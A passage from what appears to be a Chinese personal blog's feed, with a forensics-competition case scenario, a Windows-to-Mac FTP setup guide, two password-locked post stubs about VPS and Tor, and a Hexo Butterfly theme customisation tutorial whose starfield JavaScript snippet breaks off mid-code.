      <link href="/post/dc3f0821.html"/>
      <url>/post/dc3f0821.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-资格赛"><a href="#1-资格赛" class="headerlink" title="1 资格赛"></a>1 资格赛</h1><blockquote><p>2021年10月某日早上，本市一个名为”大路建设”的高速公路工地主管发现办公室的计算机被加密并无法开启，其后收到了勒案通知。考虑到高速公路的基建安全，主管决定报警。警方调查人员到达现场取证，发现办公室内有三部个人计算机，通过一个老款路由器接入互联网。经调查相关电子证据后，譬方怀疑一位本地男子一阿力士与本案有关，并将他拘捕。现在你被委派处理这起案件，请由以下资料分析阿力士在本案中的违法犯罪行为，并还原事件经过。</p><p>材料:</p><ul><li>阿力士的背景资料</li><li>警方现场勘查调查报告</li><li>高速公路工地办公室路由器记录(<strong>log路由器日志文件</strong>)</li><li>工地主管办公室计算机的电子数据(<strong>计算机镜像文件</strong>)</li><li>工地主管移动电话的电子数据(<strong>IPhone6的ufdr备份文件</strong>)</li><li>阿力士计算机的电子数据(<strong>计算机镜像文件</strong>)</li><li>阿力士FTP服务器的电子数据(<strong>服务器镜像文件</strong>)</li><li>阿力士移动电话(1)的电子数据(<strong>IPhone12的ufdr备份文件</strong>)</li><li>阿力士移动电话(2)的电子数据(<strong>IPhoneXR的ufdr备份文件</strong>)</li></ul></blockquote><br><hr><br><h1 id="2-团体赛"><a href="#2-团体赛" class="headerlink" title="2 团体赛"></a>2 团体赛</h1><p>几天后，”大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭到公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设“的案件十分相似，因此引起调查人员怀<br>疑两起案件有所关联。<br>经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和”特普”在本案中是否有违法犯罪，并还原事件经过。</p><blockquote><p>与「大路建设」相关的材料:</p><ul><li><p>工地职员A办公室计算机的电子数据(<strong>计算机镜像文件</strong>)</p></li><li><p>工地职员B办公室计算机的电子数据(<strong>计算机镜像文件</strong>)</p></li></ul></blockquote><br><blockquote><p>与「元材原料」相关的材料:</p><ul><li>网页服务器的电子数据(<strong>服务器镜像文件</strong>)</li></ul></blockquote><br><blockquote><p>与「常威」相关的资料:</p><ul><li><p>常威的背景资料</p></li><li><p>常威手机的电子数据(<strong>安卓手机镜像</strong>)</p></li><li><p>常威USB设备的电子数据(<strong>USB镜像</strong>)</p></li><li><p>常威Windows计算机的电子数据(<strong>Windows计算机镜像文件</strong>)</p></li><li><p>常威矿机的电子数据(<strong>LINUX计算机镜像文件</strong>)</p></li><li><p>常威无人机的电子数据(<strong>和手机镜像类似</strong>)</p></li><li><p>常威无人机内存卡的电子数据</p></li><li><p>常威MAC计算机的电子数据(<strong>MAC计算机aff4格式镜像文件</strong>)</p></li><li><p>常威LINUX计算机的电子数据(<strong>LINUX计算机镜像文件</strong>)</p></li></ul></blockquote><br><blockquote><p>与「特普」相关的资料:</p><ul><li><p>特普的背景资料</p></li><li><p>特普手机的电子数据(<strong>安卓手机镜像</strong>)</p></li><li><p>特普Windows计算机的电子数据(<strong>Windows计算机镜像文件</strong>)</p></li><li><p>特普Windows计算机存储器提取的镜像文件(<strong>内存镜像</strong>)</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows和mac快捷互传文件</title>
      <link href="/post/7ead17b2.html"/>
      <url>/post/7ead17b2.html</url>
      
        <content type="html"><![CDATA[<p><strong>在windows和mac之间互相传文件一直都很蛋疼,网上大多数教程说的在windows上设置共享文件夹的方法时而好用时而不好用,而且速度感人😅,需要找一个更快捷的互传文件方法</strong></p><p>在windows10上搭建FTP服务器,然后mac直接通过FileZilla等FTP软件来上传和下载就好了(<strong>当然两者要在同一个局域网里</strong>)</p><h1 id="1安装IIS工具-启动FTP服务"><a href="#1安装IIS工具-启动FTP服务" class="headerlink" title="1安装IIS工具,启动FTP服务"></a>1安装IIS工具,启动FTP服务</h1><p><strong>控制面板-程序和功能-启动或关闭windows功能</strong></p><img src="/images/winftp/image-20220803173147596.png" alt="image-20220803173147596" style="zoom:67%;" /><p>把FTP下面的选项都点上:</p><img src="/images/winftp/image-20220803173214403.png" alt="image-20220803173214403" style="zoom:67%;" /><p>设置开机启动FTP服务:</p><p><code>win+r</code> 运行 <code>services.msc</code>:</p><img src="/images/winftp/image-20220803173258129.png" alt="image-20220803173258129" style="zoom:67%;" /><p>找到其中的FTP服务,修改启动类型为自动</p><img src="/images/winftp/image-20220803173306856.png" alt="image-20220803173306856" style="zoom:67%;" /><br><hr><br><h1 id="2创建一个用于FTP的用户账户"><a href="#2创建一个用于FTP的用户账户" class="headerlink" title="2创建一个用于FTP的用户账户"></a>2创建一个用于FTP的用户账户</h1><p>直接添加一个名为share的账户就好</p><img src="/images/winftp/image-20220803173503472.png" alt="image-20220803173503472" style="zoom: 67%;" /><br><hr><br><h1 id="3配置FTP服务器站点"><a href="#3配置FTP服务器站点" class="headerlink" title="3配置FTP服务器站点"></a>3配置FTP服务器站点</h1><p><strong>控制面板-管理工具-Internet Information Services (IIS)管理器</strong></p><p>右键添加FTP站点:</p><img src="/images/winftp/image-20220803173725345.png" alt="image-20220803173725345" style="zoom:67%;" /><p>这里添加一个用于传输文件的目录,用户连接FTP后就可以向这个位置上传,或从这个位置下载:</p><img src="/images/winftp/image-20220803173746835.png" alt="image-20220803173746835" style="zoom:67%;" /><p>下一步,配置本地(FTP服务器)的IP和端口(这里没有使用FTP的默认端口21):</p><img src="/images/winftp/image-20220803173834660.png" alt="image-20220803173834660" style="zoom:50%;" /><img src="/images/winftp/image-20220803173903922.png" alt="image-20220803173903922" style="zoom:50%;" /><br><hr><br><h1 id="4-检查windows防火墙"><a href="#4-检查windows防火墙" class="headerlink" title="4 检查windows防火墙"></a>4 检查windows防火墙</h1><p>左下角通过搜索打开 <code>windows安全中心</code></p><p>左侧<code>防火墙和网络保护</code>–下方<code>允许应用通过防火墙</code>,进去之后找到FTP并勾选即可</p><img src="/images/winftp/image-20220803174058206.png" alt="image-20220803174058206" style="zoom:67%;" /><br><hr><br><h1 id="5-配置成功"><a href="#5-配置成功" class="headerlink" title="5 配置成功"></a>5 配置成功</h1><p>现在可以在mac端使用FileZilla等工具连接并上传下载文件了</p><img src="/images/winftp/image-20220803174211731.png" alt="image-20220803174211731" style="zoom:67%;" /><p>主机的局域网IP需要在windows中通过<code>ipconfig</code>命令来查看</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在VPS上配置使用snowflake网桥的Tor</title>
      <link href="/post/3b7c15b1.html"/>
      <url>/post/3b7c15b1.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a10c877f731a6c1f3e4b2465b4b9cc041074381a6c22833a337df0dcf41b5bf1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Tor </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tor </tag>
            
            <tag> VPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>购买VPS和一些初始设置</title>
      <link href="/post/4e671577.html"/>
      <url>/post/4e671577.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="22d76a54047d7c8e2f7aa3f8bafe3270390517d98cf5a3e22010314e93229ba0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> VPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进一步丰富和美化hexo-butterfly</title>
      <link href="/post/afe254ee.html"/>
      <url>/post/afe254ee.html</url>
      
        <content type="html"><![CDATA[<h1 id="0常用命令"><a href="#0常用命令" class="headerlink" title="0常用命令"></a>0常用命令</h1><p>创建新博客:(在blog目录下执行)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post 文件名</span><br></pre></td></tr></table></figure><p>博客写好后部署到本地查看效果:(执行后可以浏览器访问<a href="http://localhost:4000/">http://localhost:4000</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><ul><li><strong>hexo cl</strong> : 清除缓存和之前生成的public目录</li><li><strong>hexo g</strong> : 根据source目录来生成新的public目录</li><li><strong>hexo s</strong> : 部署到本地(默认是4000端口)</li></ul><p>部署到github仓库:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="1文章侧边栏的目录问题"><a href="#1文章侧边栏的目录问题" class="headerlink" title="1文章侧边栏的目录问题"></a>1文章侧边栏的目录问题</h1><p>在主题目录下的 _config.yml 中修改:</p><ul><li><strong>number: false</strong> 目录默认不在每一项前增加编号.  当此项为true时,如果在文章标题里增加了编号数字,目录中就会重复添加</li><li><strong>expand: true</strong> 目录默认展开所有小标题,这样看得更清楚</li></ul><p><img src="/images/hexo-butterfly/image-20220723110705308.png" alt="image-20220723110705308"></p><br><hr><br><h1 id="2生成HTML后的文件默认路径问题"><a href="#2生成HTML后的文件默认路径问题" class="headerlink" title="2生成HTML后的文件默认路径问题"></a>2生成HTML后的文件默认路径问题</h1><p>默认情况下,生成public目录后,其中每一篇文章的默认存储路径都是:</p><p><code>**年/月/日/文件名.html**</code></p><p>这样过于复杂,而且在需要设置相对路径的链接时也很不方便</p><p>解决这个问题可以安装hexo-abbrlink插件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><p><img src="/images/hexo-butterfly/image-20220723111258954.png" alt="image-20220723111258954"></p><p>安装完成后,去blog根目录的_config.yml中修改:把之前的注释掉,然后添加圈内的内容</p><p><img src="/images/hexo-butterfly/image-20220723112459827.png" alt="image-20220723112459827"></p><p>这样以来,每次生成的html文件名和路径都是固定且唯一的</p><br><hr><br><h1 id="3本地搜索插件"><a href="#3本地搜索插件" class="headerlink" title="3本地搜索插件"></a>3本地搜索插件</h1><p>安装搜索插件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>安装完成后先去 blog根目录的 _config.yml 中追加这一段:</p><p><img src="/images/hexo-butterfly/image-20220723114707555.png" alt="image-20220723114707555"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索功能</span></span><br><span class="line"><span class="attr">search:</span> </span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span>  <span class="comment"># 搜索后生成的文件路径,可选xml和json两种格式</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span>  <span class="comment"># 搜索范围,post表示所有的文章</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span>  <span class="comment"># 是否包含搜索到的文章的全部内容。如果false，生成的结果只包括标题和创建时间这些信息，没有文章主体。默认情况下是true.</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span> <span class="comment"># 搜索到的内容\选项的形式</span></span><br><span class="line">  <span class="comment"># html:缩略html原文本/   striptags:缩略html原文本,并删除所有标记/  raw:原文本</span></span><br></pre></td></tr></table></figure><p>然后去主题目录下的 _config.yml中修改:</p><p><img src="/images/hexo-butterfly/image-20220723115224625.png" alt="image-20220723115224625"></p><br><hr><br><h1 id="4侧边栏"><a href="#4侧边栏" class="headerlink" title="4侧边栏"></a>4侧边栏</h1><h2 id="4-1个人信息卡片"><a href="#4-1个人信息卡片" class="headerlink" title="4.1个人信息卡片"></a>4.1个人信息卡片</h2><h3 id="4-1-1个人信息"><a href="#4-1-1个人信息" class="headerlink" title="4.1.1个人信息"></a>4.1.1个人信息</h3><p>头像在主题目录的 _config.yml 中修改</p><img src="/images/hexo-butterfly/image-20220725132217868.png" alt="image-20220725132217868" style="zoom:67%;" /><p>作者名在blog根目录的 _config.yml 中的站点信息里修改</p><img src="/images/hexo-butterfly/image-20220725132323932.png" alt="image-20220725132323932" style="zoom:67%;" /><br><h3 id="4-1-2社交小图标"><a href="#4-1-2社交小图标" class="headerlink" title="4.1.2社交小图标"></a>4.1.2社交小图标</h3><img src="/images/hexo-butterfly/image-20220725124659890.png" alt="image-20220725124659890" style="zoom: 67%;" /><p>在主题目录的 _config.yml 中修改<strong>social项下的内容</strong></p><img src="/images/hexo-butterfly/image-20220725124014517.png" alt="image-20220725124014517" style="zoom:67%;" /><p>格式为: <code>图标名(如fas fa-envelope): 图标链接到的网址 || 注释</code></p><p>图标源:<a href="https://fontawesome.com/icons?from=io">https://fontawesome.com/icons?from=io</a></p><p>图标名从这里找(但是经过测试,fa-solid必须换成fas才能生效)</p><img src="/images/hexo-butterfly/image-20220725124518539.png" alt="image-20220725124518539" style="zoom: 67%;" /><br><h3 id="4-1-3按钮"><a href="#4-1-3按钮" class="headerlink" title="4.1.3按钮"></a>4.1.3按钮</h3><p>在主题目录的 _config.yml 中修改 aside(侧边栏)-  card_author- button下的内容</p><img src="/images/hexo-butterfly/image-20220725131933872.png" alt="image-20220725131933872" style="zoom:67%;" /><img src="/images/hexo-butterfly/image-20220806152115223.png" alt="image-20220806152115223" style="zoom:67%;" /><p>添加图标的方法见:<a href="#02_01">12引入图标库iconfont</a></p><br><h2 id="4-2公告栏"><a href="#4-2公告栏" class="headerlink" title="4.2公告栏"></a>4.2公告栏</h2><p>在主题目录的 _config.yml 中修改:</p><img src="/images/hexo-butterfly/image-20220725161114191.png" alt="image-20220725161114191" style="zoom:67%;" /><p>暂时用不到</p><br><hr><br><h1 id="5主页的文章节选"><a href="#5主页的文章节选" class="headerlink" title="5主页的文章节选"></a>5主页的文章节选</h1><p>在主题目录的 _config.yml 中修改:</p><p>method的值(1&#x2F;2&#x2F;3&#x2F;4):</p><ol><li><p>description： 只显示description</p></li><li><p>both： 优先description，如果没配置description，就显示自动节选的内容</p></li><li><p>auto_excerpt：只显示自动节选</p></li><li><p>false： 不显示</p></li></ol><img src="/images/hexo-butterfly/image-20220725133037917.png" alt="image-20220725133037917" style="zoom:67%;" /><p>默认是显示自动节选:(感觉好乱..)</p><img src="/images/hexo-butterfly/image-20220725133258081.png" alt="image-20220725133258081" style="zoom:67%;" /><p>文章的description在每一篇md的front-matter里添加:</p><img src="/images/hexo-butterfly/image-20220725133516670.png" alt="image-20220725133516670" style="zoom:67%;" /><p>修改后:</p><img src="/images/hexo-butterfly/image-20220725133821062.png" alt="image-20220725133821062" style="zoom:67%;" /><br><hr><br><h1 id="6字数统计"><a href="#6字数统计" class="headerlink" title="6字数统计"></a>6字数统计</h1><p>安装插件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>在主题目录的 _config.yml 中修改:</p><img src="/images/hexo-butterfly/image-20220725134327289.png" alt="image-20220725134327289" style="zoom:67%;" /><br><hr><br><h1 id="7文章加密"><a href="#7文章加密" class="headerlink" title="7文章加密"></a>7文章加密</h1><p>不想被别人看见的文章就设置密码来保护一下</p><p>首先安装hexo提供的加密功能插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>在blog目录下的 _config.yml添加字段,启动插件</p><img src="/images/hexo-butterfly/image-20220803113008579.png" alt="image-20220803113008579" style="zoom:50%;" /><p>在想要加密的文章的Post Front-matter字段中添加:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password: 此文章的密码</span><br><span class="line">message: 密码框上方的描述文字</span><br></pre></td></tr></table></figure><p>然后打开加密的文章时就会显示需要输入密码啦(**todo:**这个密码框也太丑了🤨,回来再美化一下)</p><img src="/images/hexo-butterfly/image-20220803115223523.png" alt="image-20220803115223523" style="zoom: 50%;" /><br><hr><br><h1 id="8设置子类别"><a href="#8设置子类别" class="headerlink" title="8设置子类别"></a>8设置子类别</h1><p>在文章开头的front matter字段中这样填写:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories: </span><br><span class="line"><span class="bullet">  -</span> category1</span><br><span class="line"><span class="bullet">  -</span> sub<span class="emphasis">_category</span></span><br></pre></td></tr></table></figure><p>这样以来,此文章就会被归为<strong>category1</strong>大类下的<strong>sub_category</strong>子类</p><br><hr><br><h1 id="9使用Aplayer作为底部的音乐播放器"><a href="#9使用Aplayer作为底部的音乐播放器" class="headerlink" title="9使用Aplayer作为底部的音乐播放器"></a>9使用Aplayer作为底部的音乐播放器</h1><p>首先安装<a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md"> hexo-tag-aplayer</a>插件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-tag-aplayer --save</span><br></pre></td></tr></table></figure><p>在blog根目录的<code>_config.yml</code>中追加如下字段:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># APlayer</span></span><br><span class="line"><span class="comment"># https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md</span></span><br><span class="line"><span class="attr">aplayer:</span></span><br><span class="line">  <span class="attr">meting:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">asset_inject:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Inject the css and script (aplayer/meting)</span></span><br><span class="line"><span class="attr">aplayerInject:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>修改<code>pjax</code>字段为<code>true</code>确保切换页面时音乐不会中断</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="comment"># - xxxx</span></span><br><span class="line">    <span class="comment"># - xxxx</span></span><br></pre></td></tr></table></figure><p>在<code>inject</code>字段下的<code>bottom</code>后添加HTML代码,意思是将额外的HTML代码添加到页面底部</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">     <span class="bullet">-</span>  <span class="string">&lt;div</span> <span class="string">class=&quot;aplayer</span> <span class="literal">no</span><span class="string">-destroy&quot;</span> <span class="string">data-id=&quot;6770516155&quot;</span> <span class="string">data-server=&quot;netease&quot;</span> <span class="string">data-type=&quot;playlist&quot;</span> <span class="string">data-fixed=&quot;true&quot;</span> <span class="string">data-mini=&quot;true&quot;</span> <span class="string">data-listFolded=&quot;false&quot;</span> <span class="string">data-order=&quot;random&quot;</span> <span class="string">data-preload=&quot;none&quot;</span> <span class="string">data-autoplay=&quot;false&quot;</span> <span class="string">muted&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><p>这里是使用了网易云歌单的接口</p><ul><li><code>data-server</code>的值表示不同的音乐播放平台,如果使用QQ音乐,这里则填写<code>tencent</code></li><li><code>data-id</code>的值表示引入歌单的id,通过网页打开歌单是,从url中就可以看到这个值</li><li><code>data-type</code>数据类型,这类填写<code>playlist</code>歌单就行</li></ul><p>更多配置项含义<a href="https://butterfly.js.org/posts/507c070f">https://butterfly.js.org/posts/507c070f</a></p><img src="/images/hexo-butterfly/image-20220804010553463.png" alt="image-20220804010553463"  /><p>效果:</p><p><img src="/images/hexo-butterfly/image-20220804010315710.png" alt="image-20220804010315710"></p><br><hr><br><h1 id="10-星空背景效果"><a href="#10-星空背景效果" class="headerlink" title="10 星空背景效果"></a>10 星空背景效果</h1><p>在<code>theme\source\css\</code>目录下新建<code>universe.css</code>,并添加如下内容</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 背景宇宙星光  */</span></span><br><span class="line"><span class="selector-id">#universe</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>themes\source\js\</code>目录下新建<code>universe.js</code>,并添加如下内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dark</span>(<span class="params"></span>) &#123; <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>;<span class="keyword">var</span> n,e,i,h,t=<span class="number">.05</span>,s=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;universe&quot;</span>),o=!<span class="number">0</span>,a=<span class="string">&quot;180,184,240&quot;</span>,r=<span class="string">&quot;226,225,142&quot;</span>,d=<span class="string">&quot;226,225,224&quot;</span>,c=[];<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;n=<span class="variable language_">window</span>.<span class="property">innerWidth</span>,e=<span class="variable language_">window</span>.<span class="property">innerHeight</span>,i=<span class="number">.216</span>*n,s.<span class="title function_">setAttribute</span>(<span class="string">&quot;width&quot;</span>,n),s.<span class="title function_">setAttribute</span>(<span class="string">&quot;height&quot;</span>,e)&#125;<span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>)&#123;h.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,n,e);<span class="keyword">for</span>(<span class="keyword">var</span> t=c.<span class="property">length</span>,i=<span class="number">0</span>;i&lt;t;i++)&#123;<span class="keyword">var</span> s=c[i];s.<span class="title function_">move</span>(),s.<span class="title function_">fadeIn</span>(),s.<span class="title function_">fadeOut</span>(),s.<span class="title function_">draw</span>()&#125;&#125;<span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">reset</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">giant</span>=<span class="title function_">m</span>(<span class="number">3</span>),<span class="variable language_">this</span>.<span class="property">comet</span>=!<span class="variable language_">this</span>.<span class="property">giant</span>&amp;&amp;!o&amp;&amp;<span class="title function_">m</span>(<span class="number">10</span>),<span class="variable language_">this</span>.<span class="property">x</span>=<span class="title function_">l</span>(<span class="number">0</span>,n-<span class="number">10</span>),<span class="variable language_">this</span>.<span class="property">y</span>=<span class="title function_">l</span>(<span class="number">0</span>,e),<span class="variable language_">this</span>.<span class="property">r</span>=<span class="title function_">l</span>(<span class="number">1.1</span>,<span class="number">2.6</span>),<span class="variable language_">this</span>.<span class="property">dx</span>=<span class="title function_">l</span>(t,<span class="number">6</span>*t)+(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)*t*<span class="title function_">l</span>(<span class="number">50</span>,<span class="number">120</span>)+<span class="number">2</span>*t,<span class="variable language_">this</span>.<span class="property">dy</span>=-<span class="title function_">l</span>(t,<span class="number">6</span>*t)-(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)*t*<span class="title function_">l</span>(<span class="number">50</span>,<span class="number">120</span>),<span class="variable language_">this</span>.<span class="property">fadingOut</span>=<span class="literal">null</span>,<span class="variable language_">this</span>.<span class="property">fadingIn</span>=!<span class="number">0</span>,<span class="variable language_">this</span>.<span class="property">opacity</span>=<span class="number">0</span>,<span class="variable language_">this</span>.<span class="property">opacityTresh</span>=<span class="title function_">l</span>(<span class="number">.2</span>,<span class="number">1</span>-<span class="number">.4</span>*(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)),<span class="variable language_">this</span>.<span class="property">do</span>=<span class="title function_">l</span>(<span class="number">5e-4</span>,<span class="number">.002</span>)+<span class="number">.001</span>*(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)&#125;,<span class="variable language_">this</span>.<span class="property">fadeIn</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">fadingIn</span>&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingIn</span>=!(<span class="variable language_">this</span>.<span class="property">opacity</span>&gt;<span class="variable language_">this</span>.<span class="property">opacityTresh</span>),<span class="variable language_">this</span>.<span class="property">opacity</span>+=<span class="variable language_">this</span>.<span class="property">do</span>)&#125;,<span class="variable language_">this</span>.<span class="property">fadeOut</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">fadingOut</span>&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!(<span class="variable language_">this</span>.<span class="property">opacity</span>&lt;<span class="number">0</span>),<span class="variable language_">this</span>.<span class="property">opacity</span>-=<span class="variable language_">this</span>.<span class="property">do</span>/<span class="number">2</span>,(<span class="variable language_">this</span>.<span class="property">x</span>&gt;n||<span class="variable language_">this</span>.<span class="property">y</span>&lt;<span class="number">0</span>)&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!<span class="number">1</span>,<span class="variable language_">this</span>.<span class="title function_">reset</span>()))&#125;,<span class="variable language_">this</span>.<span class="property">draw</span>=<span class="keyword">function</span>(<span 